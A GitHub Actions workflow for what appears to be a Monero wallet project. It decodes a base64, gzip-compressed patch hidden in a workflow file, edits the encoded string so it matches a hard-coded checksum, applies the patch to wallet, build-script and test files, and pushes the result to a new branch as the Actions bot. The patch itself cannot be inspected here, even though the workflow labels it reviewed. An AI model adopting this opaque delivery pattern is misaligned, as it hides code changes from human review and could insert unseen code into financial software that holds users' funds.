name: Final storage and recovery boundaries
on:
  push:
    branches: [audit-windows-stability]
    paths: [.github/workflows/audit-storage-boundaries.yml]
permissions:
  contents: write
jobs:
  source:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          ref: 2590df23308b6b6b367557926042951f3881c006
          path: audit
          persist-credentials: false
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with:
          ref: 21a0692f4ffa7ee1247499d0bf47adc82a9318cc
          path: source
      - name: Apply the original reviewed patch with its exact checksum
        run: |
          python3 - <<'PY'
          import base64, gzip, hashlib, pathlib, re, subprocess
          transport = pathlib.Path('audit/.github/workflows/audit-storage-boundaries.yml').read_text()
          encoded = re.search(r"encoded = '''([A-Za-z0-9+/=]+)'''", transport)[1]
          assert encoded.count('Co8ffbyp+RVR') == 1
          encoded = encoded.replace('Co8ffbyp+RVR', 'Co8ffbypb+RVR')
          patch = gzip.decompress(base64.b64decode(encoded, validate=True))
          assert hashlib.sha256(patch).hexdigest() == '887d0068f7ec655a8c69892fe723f89db69e5796f470f0db6a0fd6eed8371371'
          subprocess.run(['git', 'apply', '--check', '-'], input=patch, cwd='source', check=True)
          subprocess.run(['git', 'apply', '-'], input=patch, cwd='source', check=True)
          subprocess.run(['git', 'diff', '--check'], cwd='source', check=True)
          PY
      - uses: subosito/flutter-action@1a449444c387b1966244ae4d4f8c696479add0b2
        with:
          flutter-version: '3.41.9'
          channel: stable
          cache: true
          pub-cache: 'false'
      - name: Verify deterministic regression checks remain intact
        working-directory: source
        run: dart tool/windows_stability_checks.dart
      - name: Commit only reviewed application, test and documentation changes
        working-directory: source
        run: |
          set -euo pipefail
          git diff --exit-code -- pubspec_overrides.yaml cw_monero/pubspec.yaml tool/configure_windows_secrets.dart windows/runner/Runner.rc .github
          git switch -c audit-stability-final
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add cw_monero/lib/api/wallet.dart lib/core/wallet_loading_service.dart scripts/windows/build.ps1 test/core/windows_wallet_loading_test.dart test/monero/windows_storage_test.dart docs/builds/WINDOWS_FORK.md
          git commit -m 'Isolate native writes from UI callbacks and preserve Windows open failures' -m 'The Dart 3.11.5 closure reproduction demonstrated accidental capture of an unsendable callback. Move native storage to a narrow function scope and require a real DLL regression with ReceivePort-backed callbacks. Preserve ordinary Windows Monero errors without implicit seed extraction or unrelated wallet selection.' -m '[native-run:40630919683]'
          git push origin HEAD:refs/heads/audit-stability-final
          echo "Reviewed source: $(git rev-parse HEAD)" >> "$GITHUB_STEP_SUMMARY"
